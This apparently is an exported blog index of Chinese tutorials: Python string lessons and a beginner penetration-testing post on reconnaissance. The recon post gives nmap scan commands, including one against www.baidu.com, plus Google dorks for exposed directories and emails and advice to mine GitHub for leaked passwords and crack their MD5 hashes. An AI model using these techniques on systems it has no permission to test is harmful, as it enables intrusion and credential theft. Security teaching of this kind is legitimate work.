class="python">&gt;&gt;&gt; len(&quot;Python语言程序设计&quot;)12&gt;&gt;&gt; str(3.1415926)&#39;3.1415926&#39;</code></pre><p>（2）Python字符串中每个字符都是用Unicode编码表示，因为相比ASCII编码，Unicode编码能支持几乎所有书写语言的字符。chr()和ord()函数用于在单字符和Unicode编码值之间进行转换。</p><pre><code class="python">&gt;&gt;&gt; &quot;1 + 1 = 2 &quot; + chr(10004)&#39;1 + 1 = 2 ✔&#39;&gt;&gt;&gt; &quot;金牛座字符♉对应的Unicode值：&quot; + str(ord(&quot;♉&quot;))&#39;金牛座字符♉对应的Unicode值：9801&#39;</code></pre><p>（3）凯撒密码，采用了替换方法，对信息中的每一个英文字符循环替换为字母表序列中该字符后面第三个字符。</p><p>设明文为P,密文为C，则满足：</p><pre><code class="python">加密:C = (P+3) mod 26解密:P = (C-3) mod 26</code></pre><pre><code class="Python">#加密，使用的信息仅包含小写字母plaincode = input(&quot;请输入明文：&quot;)for p in plaincode:    if ord(&quot;a&quot;) &lt;= ord(p) &lt;= ord(&quot;z&quot;):        print(chr(ord(&quot;a&quot;) + (ord(p) - ord(&quot;a&quot;) + 3)%26), end=&#39;&#39;)    else:        print(p, end=&#39; &#39;)#解密plaincode = input(&quot;请输入密文：&quot;)for c in plaincode:    if ord(&quot;a&quot;) &lt;= ord(c) &lt;= ord(&quot;z&quot;):        print(chr(ord(&quot;a&quot;) + (ord(c) - ord(&quot;a&quot;) - 3)%26), end=&#39;&#39;)    else:        print(c, end=&#39;&#39;)</code></pre><pre><code class="python">#加密结果&gt;&gt;&gt;请输入明文：python is an excellent language.sbwkrq  lv  dq  hafhoohqw  odqjxdjh. #解密结果&gt;&gt;&gt;请输入密文：sbwkrq  lv  dq  hafhoohqw  odqjxdjh.python  is  an  excellent  language.</code></pre><h3 id="内置的字符串处理方法"><a href="#内置的字符串处理方法" class="headerlink" title="内置的字符串处理方法"></a>内置的字符串处理方法</h3><p>（1）在Python解释器内部，所有数据类型都采用面向对象方式实现，封装为一个类。字符串也是一个类，具有类似&lt;a&gt;.&lt;b&gt;()形式的字符串处理函数。在面向对象中，这类函数也被称为“方法”。str为字符串</p><table><thead><tr><th align="center">方法</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center">str.lower()</td><td align="center">返回字符串str的副本，全部字符小写</td></tr><tr><td align="center">str.upper()</td><td align="center">返回字符串str的副本，全部字符大写</td></tr><tr><td align="center">str.islower()</td><td align="center">当str所有字符都是小写时，返回True，否则返回False</td></tr><tr><td align="center">str.isprintable()</td><td align="center">当str所有字符都是可打印的，返回True，否则返回False</td></tr><tr><td align="center">str.isnumeric()</td><td align="center">当str所有字符都是数字时，返回True，否则返回False</td></tr><tr><td align="center">str.isspace()</td><td align="center">当str所有字符都是空格时，返回True，否则返回False</td></tr><tr><td align="center">str.split(sep=None,maxsplit=-1)</td><td align="center">返回一个列表，由str根据sep被分隔的部分构成</td></tr><tr><td align="center">str.center(width[,fillchar])</td><td align="center">字符串居中函数</td></tr><tr><td align="center">str.zfill(width)</td><td align="center">返回字符串str的副本，长度为width，不足部分在左侧添0</td></tr></tbody></table><p>（2）str.split(sep=None,maxsplit=-1)方法返回一个列表，列表是一种存储多个数据的数据类型。其中，分隔str的标识符是sep，默认分隔符为空格。若给出参数maxsplit，则只分隔前maxsplit个字符，该参数默认可不给出。</p><pre><code class="python">&gt;&gt;&gt; &quot;Python is an excellent language.&quot;.split()[&#39;Python&#39;, &#39;is&#39;, &#39;an&#39;, &#39;excellent&#39;, &#39;language.&#39;]</code></pre><p>（3）str.center(width[,fillchar])方法返回长度为width的字符串。其中，str处于新字符串中心位置，两侧用新增字符fillchar填充。当width小于字符串长度时，返回str。</p><pre><code class="python">&gt;&gt;&gt; &quot;python&quot;.center(40,&#39;=&#39;)&#39;=================python=================&#39;</code></pre><p>（4）str.zfill(width)方法返回长度为width的字符串，若字符串长度不足width，在左侧添加字符”0”。但如果str最左侧是字符”+”或者”-“，则从第二个字符左侧添加”0”。同样，若width小于字符串长度，则返回str。</p><pre><code class="python">&gt;&gt;&gt; &quot;123&quot;.zfill(40)&#39;0000000000000000000000000000000000000123&#39;&gt;&gt;&gt; &quot;-123&quot;.zfill(40)&#39;-000000000000000000000000000000000000123&#39;</code></pre><h2 id="字符串类型的格式化"><a href="#字符串类型的格式化" class="headerlink" title="字符串类型的格式化"></a>字符串类型的格式化</h2><p>（1）要点：字符串通过format()方法进行格式化处理。</p><p>（2）字符串是程序向控制台、网络、文件等介质输出运算结果的主要形式之一，字符串类型的格式化有助于提供更好的可读性和灵活性。</p><h3 id="format-方法的基本使用"><a href="#format-方法的基本使用" class="headerlink" title="format()方法的基本使用"></a>format()方法的基本使用</h3><p>（1）基本使用格式：&lt;模板字符串&gt;.format(&lt;逗号分隔的参数&gt;)</p><p>（2）模板字符串由一系列槽组成，用来将format()方法中逗号分隔的参数按照序号关系替换到模板字符串的槽中。</p><p>（3）槽用大括号{}表示。若大括号中没有序号，则按照出现顺序替换；若大括号中指定了使用参数的序号，则按照序号对应的参数替换。序号从0开始编号。</p><pre><code class="python">&gt;&gt;&gt; &quot;&#123;&#125;：计算机&#123;&#125;的CPU占用率为&#123;&#125;%。&quot;.format(&quot;2020-11-30&quot;,&quot;python&quot;,&quot;10&quot;) #按出现顺序0,1，2替换&#39;2020-11-30：计算机python的CPU占用率为10%。&#39;</code></pre><p>（4）format()方法可以连接不同类型的变量或内容。</p><pre><code class="python">&gt;&gt;&gt; &quot;&#123;&#125;&#123;&#125;&#123;&#125;&quot;.format(&quot;圆周率是&quot;,3.1415926,&quot;...&quot;)&#39;圆周率是3.1415926...&#39;&gt;&gt;&gt; &quot;圆周率&#123;&#123;&#123;1&#125;&#123;2&#125;&#125;&#125;是&#123;0&#125;&quot;.format(&quot;无理数&quot;,3.1415926,&quot;...&quot;)&#39;圆周率&#123;3.1415926...&#125;是无理数&#39;&gt;&gt;&gt; s=&quot;圆周率&#123;&#123;&#123;1&#125;&#123;2&#125;&#125;&#125;是&#123;0&#125;&quot;           #大括号本身是字符串的一部分&gt;&gt;&gt; s&#39;圆周率&#123;&#123;&#123;1&#125;&#123;2&#125;&#125;&#125;是&#123;0&#125;&#39;&gt;&gt;&gt; s.format(&quot;无理数&quot;,3.1415926,&quot;...&quot;)  #当调用format()时解析大括号&#39;圆周率&#123;3.1415926...&#125;是无理数&#39;</code></pre><h3 id="format-方法的格式控制"><a href="#format-方法的格式控制" class="headerlink" title="format()方法的格式控制"></a>format()方法的格式控制</h3><p>（1）format()方法中模本字符串的槽除了包括参数序号，还可以包括格式控制信息。其中，格式控制标记可以用来控制参数显示时的格式。槽内部信息如下：</p><pre><code>&#123;&lt;参数信号&gt;: &lt;格式控制标记&gt;&#125;</code></pre><table><thead><tr><th align="center">格式控制标记</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center">:</td><td align="center">引导符号</td></tr><tr><td align="center">&lt;填充&gt;</td><td align="center">用于填充单个字符</td></tr><tr><td align="center">&lt;对齐&gt;</td><td align="center">&lt; 左对齐、&gt;右对齐、^居中对齐</td></tr><tr><td align="center">&lt;宽度&gt;</td><td align="center">槽的设定输出宽度</td></tr><tr><td align="center">&lt;,&gt;</td><td align="center">数字的千分分隔符，适用于整数和浮点数</td></tr><tr><td align="center">&lt;.精度&gt;</td><td align="center">浮点数小数部分的精度或字符串的最大输出长度</td></tr><tr><td align="center">&lt;类型&gt;</td><td align="center">整数类型b，c，d，o，x，X；浮点数类型e，E，f，%</td></tr></tbody></table><p>（2）&lt;宽度&gt;指当前槽的设定输出字符宽度，如果该槽对应的format()参数长度比&lt;宽度&gt;大，则使用参数实际长度；若该值的实际位数小于指定宽度，则位数将被默认以空格字符补充。</p><pre><code class="python">&gt;&gt;&gt;s=&quot;python&quot;&gt;&gt;&gt; &quot;&#123;0:30&#125;&quot;.format(s)           #默认左对齐&#39;python                        &#39;&gt;&gt;&gt; &quot;&#123;0:3&#125;&quot;.format(s)            #参数比宽度大，直接输出字符实际长度 &#39;python&#39;</code></pre><p>（3）&lt;对齐&gt;指参数在宽度内输出时的对齐方式。&lt;填充&gt;指宽度内除了参数外的字符采用什么方式表示，默认采用空格，可以通过填充更换。</p><pre><code class="python">&gt;&gt;&gt; &quot;&#123;0:&gt;30&#125;&quot;.format(s)             #右对齐&#39;                        python&#39;&gt;&gt;&gt; &quot;&#123;0:*^30&#125;&quot;.format(s)            #居中对齐且使用*填充&#39;************python************&#39;</code></pre><p>（4）格式控制标记中的逗号(,)用于显示数字类型的千位分隔符。</p><pre><code class="python">&gt;&gt;&gt; &quot;&#123;0:-^20,&#125;&quot;.format(1234567890)&#39;---1,234,567,890----&#39;&gt;&gt;&gt; &quot;&#123;0:-^20,&#125;&quot;.format(12345.67890)&#39;----12,345.6789-----&#39;</code></pre><p>（5）&lt;.精度&gt;表示两个含义，由小数点(.)开头。对于浮点数，精度表示小数部分输出的有效位。对于字符串，精度表示最大输出长度。</p><pre><code class="python">&gt;&gt;&gt; &quot;&#123;0:.2f&#125;&quot;.format(12345.67890)&#39;12345.68&#39;&gt;&gt;&gt; &quot;&#123;0:.4&#125;&quot;.format(&quot;python&quot;)&#39;pyth&#39;</code></pre><p>（6）&lt;类型&gt;表示输出整数和浮点数类型的格式规则。</p><table><thead><tr><th align="center">整数类型输出格式</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center">b</td><td align="center">输出整数的二进制方式</td></tr><tr><td align="center">c</td><td align="center">输出整数对应的Unicode字符</td></tr><tr><td align="center">d</td><td align="center">输出整数的十进制方式</td></tr><tr><td align="center">o</td><td align="center">输出整数的八进制方式</td></tr><tr><td align="center">x</td><td align="center">输出整数的小写十六进制方式</td></tr><tr><td align="center">X</td><td align="center">输出整数的大写十六进制方式</td></tr></tbody></table><pre><code class="python">&gt;&gt;&gt; &quot;&#123;0:b&#125;,&#123;0:c&#125;,&#123;0:d&#125;,&#123;0:o&#125;,&#123;0:x&#125;,&#123;0:X&#125;&quot;.format(425)&#39;110101001,Ʃ,425,651,1a9,1A9&#39;</code></pre><table><thead><tr><th align="center">浮点数类型输出格式</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center">e</td><td align="center">输出浮点数对应的小写字母e的指数形式</td></tr><tr><td align="center">E</td><td align="center">输出浮点数对应的大写字母e的指数形式</td></tr><tr><td align="center">f</td><td align="center">输出浮点数的标准浮点形式</td></tr><tr><td align="center">%</td><td align="center">输出浮点数的百分形式</td></tr></tbody></table><pre><code class="python">&gt;&gt;&gt; &quot;&#123;0:.2e&#125;,&#123;0:.2E&#125;,&#123;0:.2f&#125;,&#123;0:.2%&#125;&quot;.format(3.14)&#39;3.14e+00,3.14E+00,3.14,314.00%&#39;</code></pre><h2 id="实例：文本进度条"><a href="#实例：文本进度条" class="headerlink" title="实例：文本进度条"></a>实例：文本进度条</h2><h3 id="非刷新文本进度条"><a href="#非刷新文本进度条" class="headerlink" title="非刷新文本进度条"></a>非刷新文本进度条</h3><p>（1）按照任务执行百分比将整个任务划分为100个单位，每执行N%输出一次进度条。每一行输出包含进度百分比，代表已完成的部分(**)和未完成的部分(..)的两种字符，以及一个跟随完成度前进的小箭头。</p><p>（2）由于直接进行字符输出几乎是瞬间完成，为了便于观察，调用Python标准时间库time，使用time.sleep()函数将当前程序暂时挂起为t秒，t可以是小数。以此模拟进度条效果输出。</p><pre><code class="python">import timescale = 10                              #scale表示输出进度条的精度，修改后会有不同的效果print(&quot;------执行开始------&quot;)             #print()函数在输出结尾处会自动产生一个&#39;\n&#39;，即换行符for i in range(scale+1):    a, b = &#39;**&#39; * i, &#39;..&#39; * (scale - i)    c = (i/scale)*100    print(&quot;%&#123;:^3.0f&#125;[&#123;&#125;-&gt;&#123;&#125;]&quot;.format(c, a, b))    time.sleep(0.1)print(&quot;------执行结束------&quot;)</code></pre><p>（3）运行结果：</p><pre><code class="python">&gt;&gt;&gt;------执行开始------% 0 [-&gt;....................]%10 [**-&gt;..................]%20 [****-&gt;................]%30 [******-&gt;..............]%40 [********-&gt;............]%50 [**********-&gt;..........]%60 [************-&gt;........]%70 [**************-&gt;......]%80 [****************-&gt;....]%90 [******************-&gt;..]%100[********************-&gt;]------执行结束------</code></pre><h3 id="单行动态刷新"><a href="#单行动态刷新" class="headerlink" title="单行动态刷新"></a>单行动态刷新</h3><p>（1）将每一次精度输出都固定在同一行，不断用新生成的字符串覆盖之前的输出，形成单行动态刷新的效果。</p><p>（2）采用print()函数，在该函数中更换参数end的默认值为’’，即每次使用print()函数输出时不换行。此时，系统输出指针还停留在上一次输出的行尾，下一次输出在字符串前部增加转义符’\r’,该转义符把输出指针移动到行首而不换行。</p><pre><code class="python">import timefor i in range(101):    print(&quot;\r&#123;:3&#125;%&quot;.format(i),end=&#39;&#39;)    time.sleep(0.05)</code></pre><p>（3）运行结果：</p><p><img src="https://i.loli.net/2020/11/30/YB5wiGKdHyn2LWz.png" alt="image-20201130190704002"></p><p>（4）由于IDLE本身屏蔽了单行刷新功能，所以运行结果并没有出现单行刷新。若要获得刷新效果，选择到e4.2TextProgressBar.py文件所在目录，使用命令行工具cmd执行如下命令:</p><pre><code>python e4.2TextProgressBar.py</code></pre><p>也可使用PyCharm运行这个单行动态刷新程序，可直接看到单行刷新效果。</p><p><img src="https://i.loli.net/2020/11/30/Y2vryMeVR9ZwTtF.png" alt="image-20201130192609421"></p><h3 id="带刷新的文本进度条"><a href="#带刷新的文本进度条" class="headerlink" title="带刷新的文本进度条"></a>带刷新的文本进度条</h3><p>（1）在文本进度条中增加运行时间的监控。</p><p>（2）这里采用time库中的time.clock()函数。time.clock()函数一般多次出现，第一次调用时计时开始，同一程序中第二次及后续调用时返回与第一次计时之间的时间差，单位为秒。该函数主要用来统计程序运行时间，增加用户体验。</p><pre><code class="python">import timescale = 50print(&quot;执行开始&quot;.center(scale // 2,&#39;-&#39;))t = time.clock()for i in range(scale+1):    a = &#39;*&#39; * i    b = &#39;.&#39; * (scale-i)    c = (i/scale)*100    t = time.clock() - t    print(&quot;\r&#123;:^3.0f&#125;%[&#123;&#125;-&gt;&#123;&#125;]&#123;:.2f&#125;s&quot;.format(c, a, b, t), end=&#39;&#39;)    time.sleep(0.05)print(&quot;\n&quot;+&quot;执行结束&quot;.center(scale // 2,&#39;-&#39;))</code></pre><p>（3）在PyCharm中运行结果：</p><p><img src="https://i.loli.net/2020/11/30/nTDRXCghKbp6xHf.png" alt="image-20201130195623749"></p>]]></content>
      
      
      
        <tags>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>信息收集技术</title>
      <link href="2020/11/28/%E5%AE%89%E5%85%A8%E5%88%9D%E7%BA%A7/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E6%8A%80%E6%9C%AF/"/>
      <url>2020/11/28/%E5%AE%89%E5%85%A8%E5%88%9D%E7%BA%A7/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E6%8A%80%E6%9C%AF/</url>
      
        <content type="html"><![CDATA[<h2 id="渗透测试"><a href="#渗透测试" class="headerlink" title="渗透测试"></a>渗透测试</h2><p>（1）渗透测试，是通过模拟恶意黑客的攻击方法，来评估计算机网络系统安全的一种评估方法。</p><p>（2）黑客攻击模型(渗透测试思路）：</p><table><thead><tr><th align="center">操作</th><th align="center">目的</th></tr></thead><tbody><tr><td align="center">踩点</td><td align="center">信息收集(前提)</td></tr><tr><td align="center">定位</td><td align="center">分析目标，寻找漏洞:系统漏洞(ms17-010)、web漏洞(sql、xss)</td></tr><tr><td align="center">入侵</td><td align="center">利用漏洞，通过工具或构造攻击代码(payload)实施攻击，获取权限(shell界面)</td></tr><tr><td align="center">上传木马文件(留后门)或病毒</td><td align="center">方便再次进入或实施破坏</td></tr><tr><td align="center">抹去痕迹</td><td align="center">清理入侵记录</td></tr></tbody></table><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>信息收集，俗称踩点，是渗透测试的前提，也是最重要的阶段之一。为了启动渗透测试，用户需要收集关于目标网络资产等信息。用户得到的信息越多，渗透测试成功的概率也就越高。</p><h3 id="域名信息收集"><a href="#域名信息收集" class="headerlink" title="域名信息收集"></a>域名信息收集</h3><p>（1）whois协议，用来查询域名是否已经被注册，以及注册域名的详细信息的数据库(如域名所有人、域名注册商)。在线查询工具：站长之家<a href="http://whois.chinaz.com/">http://whois.chinaz.com/</a></p><p>（2）子域名，是顶级域名(.com、.cn、.top)的下一级，域名整体包括两个”.”或包括一个”/“。例如：百度的顶级域名为baidu.com。其下的子域名有：news.baidu.com、tieba.baidu.com、zhidao.baidu.com……收集子域名可以很大程度知道目标所拥有的网站等资产信息。</p><p>（3）子域名查询在线工具：<a href="https://phpinfo.me/domain/">https://phpinfo.me/domain/</a>。其他工具：FuzzDomain、子域名挖掘机</p><h3 id="旁站C段"><a href="#旁站C段" class="headerlink" title="旁站C段"></a>旁站C段</h3><p>（1）查询旁站指某个服务器同一个IP地址的所有域名</p><p>（2）查询C段指某个服务器IP地址所在C段IP地址的所有域名</p><p>（3）注释：IP地址：A段.B段.C段.D段 C段查询就是ABC段相同，D段不同的IP地址下的所有域名；旁站查询是同IP地址下的所有域名。<br>例：旁站查询：192.168.193.2的所有域名，C段查询：192.168.193.0同网段下的所有域名</p><p>（3）在线查询工具：<a href="https://chapangzhan.com/">https://chapangzhan.com</a></p><h3 id="征信查询"><a href="#征信查询" class="headerlink" title="征信查询"></a>征信查询</h3><p>（1）企业征信机构记录了一家企业的基本信息，历史沿革，股东及出资等信息的平台。</p><p>（2）查询：<a href="https://icredit.jd.com/">https://icredit.jd.com</a>、天眼查：<a href="https://www.tianyancha.com/">https://www.tianyancha.com</a></p><h3 id="DNS查询"><a href="#DNS查询" class="headerlink" title="DNS查询"></a>DNS查询</h3><p>（1）获取域名或者IP地址，并进行反向查找以快速显示同一服务器承载的所有其他域。</p><p>（2）查询：Viewdns：<a href="http://viewdns.info/">http://viewdns.info</a>、DNSdb：<a href="https://www.dnsdb.io/">https://www.dnsdb.io</a> 也可用命令nslookup [域名]</p><h3 id="IP查询"><a href="#IP查询" class="headerlink" title="IP查询"></a>IP查询</h3><p>（1）根据IP地址查询同一IP地址的其他信息</p><p>（2）在线查询：114best：<a href="http://www.114best.com/">http://www.114best.com</a></p><h3 id="备案号查询"><a href="#备案号查询" class="headerlink" title="备案号查询"></a>备案号查询</h3><p>（1）备案号是网站是否合法注册经营的标志，一个网站域名要上线必然要经过备案程序，通过备案号反查可查询目标的所有合法网站。</p><p>（2）在线查询：<a href="http://icp.chinaz.com/">http://icp.chinaz.com</a></p><h3 id="密码收集"><a href="#密码收集" class="headerlink" title="密码收集"></a>密码收集</h3><p>（1）gitHub是全球最大的面向开源及私有软件项目的托管平台。许多企业的开发人员在上传开源代码到github往往忽略了将密码等敏感信息删除导致信息泄露。</p><p>（2）在github上搜索网站及关键字，在Code中查看。通常查看到的密码都使用了MD5加密，可用在线工具进行破解。 <a href="https://github.com/">github.com</a></p><p><img src="https://i.loli.net/2020/11/29/xUcBnq5HYrawLOJ.png" alt="image-20201129121609316"></p><h3 id="Google-hacking"><a href="#Google-hacking" class="headerlink" title="Google hacking"></a>Google hacking</h3><p>（1）搜索引擎都会提供相应搜索语法，通过搜索语法可以快速得到想要的信息。</p><p>（2）推荐搜索引擎：必应：bing.com、百度：baidu.com、谷歌：google.com</p><p>（3）推荐语法：</p><table><thead><tr><th align="center">语法</th><th align="center">功能</th></tr></thead><tbody><tr><td align="center">Intitle:</td><td align="center">搜索网站标题含有的关键字</td></tr><tr><td align="center">Inurl:</td><td align="center">搜索url含有的关键字</td></tr><tr><td align="center">Intext:</td><td align="center">搜索网页正文含有的关键字</td></tr><tr><td align="center">Site:</td><td align="center">搜索特定网站和网站域名</td></tr><tr><td align="center">Filetype:</td><td align="center">搜索特定文档格式</td></tr></tbody></table><pre><code>intitle:&quot;index of&quot;        //搜索网站目录泄露页面intext:京ICP备09031924号   //备案号查询intext:&quot;@163.com&quot;         //邮箱搜集</code></pre><p><img src="https://i.loli.net/2020/11/28/nUJAZcvkyDB7d24.png" alt="image-20201128215731922"></p><p><img src="https://i.loli.net/2020/11/28/dLP9H6cIqkbnjN7.png" alt="image-20201128214905209"></p><p>（4）URL采集器：快速切换搜索引擎，快速获得搜索结果</p><p><img src="https://i.loli.net/2020/12/01/tH5kBC9zT7DQueR.png" alt="image-20201201223132842"></p><h2 id="端口扫描技术"><a href="#端口扫描技术" class="headerlink" title="端口扫描技术"></a>端口扫描技术</h2><p>（1）端口扫描通常使用专门的端口扫描工具来进行。可以详细收集目标开放的端口、服务、应用版本、操作系统、活跃主机等多种信息。</p><p>（2）端口扫描流程：</p><table><thead><tr><th align="center">扫描流程(按顺序)</th><th align="center">相关操作</th></tr></thead><tbody><tr><td align="center">存活判断</td><td align="center">Ping、TCP扫描、UDP扫描</td></tr><tr><td align="center">端口扫描</td><td align="center">TCP扫描、UDP扫描</td></tr><tr><td align="center">服务识别</td><td align="center">基于端口、基于banner、基于指纹</td></tr></tbody></table><p>（3）端口探测技术，一般通过发送建立连接过程涉及的相关报文，根据返回包的情况来判断目标端口是否开放。主流的扫描方式有：利用TCP面向连接三次握手、四次挥手过程包，UDP非面向连接请求</p><p>（4）服务识别技术，用于识别端口上运行的服务。识别方式有三种，实际使用通常需要相互配合使用</p><table><thead><tr><th align="center">识别方式</th><th align="center">判断方式</th><th align="center">准确率</th><th align="center">效率</th></tr></thead><tbody><tr><td align="center">基于端口</td><td align="center">根据端口默认运行的服务进行判断</td><td align="center">低</td><td align="center">高</td></tr><tr><td align="center">基于banner</td><td align="center">根据访问端口获取的欢迎界面来判断</td><td align="center">中</td><td align="center">高</td></tr><tr><td align="center">基于指纹</td><td align="center">根据不同系统不同服务具有不同的TCP/IP协议栈来判断</td><td align="center">高</td><td align="center">低</td></tr></tbody></table><p>banner：访问一个主机端口时，该端口所运行的服务有时会返回对应服务和版本号。</p><p><img src="https://i.loli.net/2020/11/28/DIPsx5gLSfU2ETn.png" alt="image-20201128222945585"></p><h2 id="Nmap端口扫描器"><a href="#Nmap端口扫描器" class="headerlink" title="Nmap端口扫描器"></a>Nmap端口扫描器</h2><p>（1）诸神之眼——Nmap(Network Mapper)，在网络中具有强大的信息收集能力。</p><p>（2）Nmap具备主机探测、服务/版本检测、操作系统检测、网络路由跟踪、Nmap脚本引擎的功能。</p><p>（3）Nmap是kali中自带的工具，命令格式：nmap [参数] IP/IP段/主机名。例如：</p><pre><code>nmap -v -sS -O 10.2.2.2</code></pre><h3 id="选项"><a href="#选项" class="headerlink" title="选项"></a>选项</h3><p>（1）Nmap TCP扫描端口选项</p><table><thead><tr><th align="center">选项</th><th align="center">作用</th></tr></thead><tbody><tr><td align="center">-sP或-sn</td><td align="center">用ping的方式判断是否有存活主机，不扫描端口(要加上掩码，例:10.10.10.0/24)</td></tr><tr><td align="center">-sT</td><td align="center">使用TCP全连接扫描，对目标主机所有端口进行完整的三次握手，如果成功建立连接，则端口是开放的。速度慢，</td></tr><tr><td align="center">-sS</td><td align="center">使用半开连接(SYN stealth)扫描，使用SYN标记位的数据包进行端口探测，收到SYN/ACK包,不再回复ACK包，则端口是开放的，收到RST/ACK包，则端口是关闭的。速度快</td></tr><tr><td align="center">-sA</td><td align="center">TCP ACK扫描使用ACK标志位数据包，若目标主机回复RST数据包，则目标端口没有被过滤(用于发现防火墙的过滤规则)</td></tr></tbody></table><p>（2）Nmap UDP扫描端口选项：</p><p>-sU    使用UDP数据包进行扫描，返回UDP报文，则端口是开放的；返回不可达则端口处于关闭或过滤状态。</p><p>（3）Nmap 目标端口选项：</p><pre><code>-p          //扫描指定端口(常用)-F          //快速扫描100个常用的端口(常用)-Pn         //开放的端口服务-r          //顺序扫描，按从小到大的顺序进行端口扫描</code></pre><p>（4）Nmap 输出选项：</p><pre><code>-oN       //标准输出为指定的文件,也可用导出符&#39;&gt;&#39;,例&gt; 1.txt-oX       //生成XML格式文件可以转换成HTML文件</code></pre><p>（5）其他常用选项:</p><pre><code>-sV      //检测服务端软件版本信息(常用)-O       //检测操作系统信息(常用)-Pn      //禁用nmap的主机检测功能-A       //探测服务版本、对操作系统进行识别、进行脚本扫描、进行路由探测</code></pre><h3 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h3><pre><code>#使用TCP的SYN扫描检测baidu.com站点的服务版本，系统信息以及扫描常见100个端口nmap -sS -sV -O -F www.baidu.com</code></pre><p><img src="https://i.loli.net/2020/11/28/mVWkoXBKMt9vAY8.png" alt="image-20201128225426693"></p><pre><code>#使用UDP探测scanme.nmap.org的DNS(53),SNMP(161),NTP(123)服务nmap -sU -p 53,161,123 scanme.nmap.org#open   开放#close  关闭#filtered 被过滤</code></pre><p><img src="https://i.loli.net/2021/01/31/SoxlKWvh6ftqMXy.png" alt="image-20210131150814806"></p><pre><code>#获取IP地址段10.10.10.0/24所有在线主机nmap -sP 10.10.10.0/24</code></pre><p><img src="https://i.loli.net/2020/11/28/euU1NCdqnDxoZ4b.png" alt="image-20201128230406623"></p><pre><code>#找出192.168.100.0/24网段所有开放80端口的IP，并把结果保存到result.txtnmap -sT -p 80 --open 192.168.100.0/24  -oN result.txt</code></pre><p><img src="https://i.loli.net/2020/11/28/KrloWijMNvsghxn.png" alt="image-20201128231811428"></p><h3 id="Nmap图形化–Zenmap"><a href="#Nmap图形化–Zenmap" class="headerlink" title="Nmap图形化–Zenmap"></a>Nmap图形化–Zenmap</h3><p>Zenmap是用Python开发的nmap图形化界面，直接在kali终端中输入zenmap即可打开。使用方法：</p><p>（1）输入目标主机的IP地址或域名</p><p>（2）选择一种扫描方式</p><p>（3）根据扫描结果，更改扫描的配置参数或扫描方式，进行再次扫描，以获得更多可利用的、有效的信息。</p><p>（4）开始扫描</p><p>（5）分析zenmap的扫描结果，利用有效信息进一步渗透。</p><p><img src="https://i.loli.net/2020/11/28/Z7a9l8cUomfEbCr.png" alt="image-20201128232633401"></p><h2 id="知识扩展"><a href="#知识扩展" class="headerlink" title="知识扩展"></a>知识扩展</h2><p>在黑客术语里面，”拖库“是指黑客入侵有价值的网络站点，把注册用户的资料数据库全部盗走的行为，因为谐音，也经常被称作“脱裤”，360的库带计划，奖励提交漏洞的白帽子，也是因此而得名。在取得大量的用户数据之后，黑客会通过一系列的技术手段和黑色产业链将有价值的用户数据变现，这通常也被称作“洗库”。最后黑客将得到的数据在其它网站上进行尝试登陆，叫做”撞库“，因为很多用户喜欢使用统一的用户名密码，”撞库“也可以使黑客收获颇丰。</p>]]></content>
      
      
      
        <tags>
            
            <tag> 安全初级 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>深入Python语言(一)</title>
      <link href="2020/11/28/Python/%E6%B7%B1%E5%85%A5Python%E8%AF%AD%E8%A8%80(%E4%B8%80)-%E5%9F%BA%E6%9C%AC%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B01/"/>
      <url>2020/11/28/Python/%E6%B7%B1%E5%85%A5Python%E8%AF%AD%E8%A8%80(%E4%B8%80)-%E5%9F%BA%E6%9C%AC%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B01/</url>
      
        <content type="html"><![CDATA[<h2 id="数字类型"><a href="#数字类型" class="headerlink" title="数字类型"></a>数字类型</h2><p>表示数字或数值的数据类型称为数字类型，Python语言提供3种数字类型：整数、浮点数和复数，分别对应数学中的整数、实数和复数。</p><h3 id="整数类型"><a href="#整数类型" class="headerlink" title="整数类型"></a>整数类型</h3><p>（1）整数类型与数学中的整数概念一致，整数类型共有4种进制表示：十进制、二进制、八进制和十六进制。默认情况，整数采用十进制，其他进制需要增加引导符号。</p><table><thead><tr><th align="center">进制种类</th><th align="center">引导符号</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center">十进制</td><td align="center">无</td><td align="center">默认情况下使用</td></tr><tr><td align="center">二进制</td><td align="center">0b 或 0B</td><td align="center">由0和1组成，例如：0b101,0B101</td></tr><tr><td align="center">八进制</td><td align="center">0o 或 0O</td><td align="center">由字符0到7组成，例如：0o711,0O711</td></tr><tr><td align="center">十六进制</td><td align="center">0x 或 0X</td><td align="center">由字符0到9、a到f、A到F组成，例如0xABC</td></tr></tbody></table><p>（2）整数类型理论上的取值范围是负无穷到正无穷，实际上的取值范围受限于运行Python程序的计算机内存大小。除极大数的运算外，一般认为整数类型没有取值范围限制。</p><p>（3）pow(x,y)函数是Python语言的一个内置函数，用来计算x的y次方。可以使用该函数来测试整数类型的取值范围。例如：</p><pre><code class="python">&gt;&gt;&gt;pow(2,100)1267650600228229401496703205376&gt;&gt;&gt;pow(2,500)3273390607896141870013189696827599152216642046043064789483291368096133796404674554883270092325904157150886684127560071009217256545885393053328527589376</code></pre><p>（4）pow()函数还可以嵌套使用</p><pre><code class="python">&gt;&gt;&gt;pow(2,pow(2,15))</code></pre><h3 id="浮点数类型"><a href="#浮点数类型" class="headerlink" title="浮点数类型"></a>浮点数类型</h3><p>（1）浮点数类型与数学中实数的概念一致，表示带有小数的数值。Python语言要求所有浮点数必须带有小数部分，小数部分可以是0，这样可以区分浮点数和整数类型。</p><p>（2）浮点数有两种表示方法：十进制表示和科学计数法表示。</p><p>科学计数法使用字母e或E作为幂的符号，以10为基数，含义如下：</p><pre><code>&lt;a&gt;e&lt;b&gt; = a * pow(10,b)例如：4.3e-3 =4 .3*pow(10,-3)9.6E5 = 9.6*pow(10,5)     